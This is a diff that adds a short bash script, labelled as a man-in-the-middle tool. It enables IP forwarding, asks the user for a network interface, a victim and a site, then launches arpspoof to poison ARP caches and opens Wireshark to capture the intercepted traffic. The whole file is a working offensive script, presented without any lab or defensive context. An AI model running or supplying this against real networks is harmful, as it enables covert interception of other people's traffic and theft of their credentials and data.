@@ -1,0 +1,12 @@
+#!/bin/bash
+# MiTM using Wireshark and Arpspoof
+echo 1 > /proc/sys/net/ipv4/ip_forward
+echo "Please enter interface: "
+read INTERFACE
+echo "Whos traffic do you want to intercept? "
+read TARGET
+echo "What site are you targeting? "
+read SITE
+echo "Stand by, preparing to poison target.... "
+sleep 5
+arpspoof -i $INTERFACE -t $SITE -r $TARGET & xterm -e wireshark
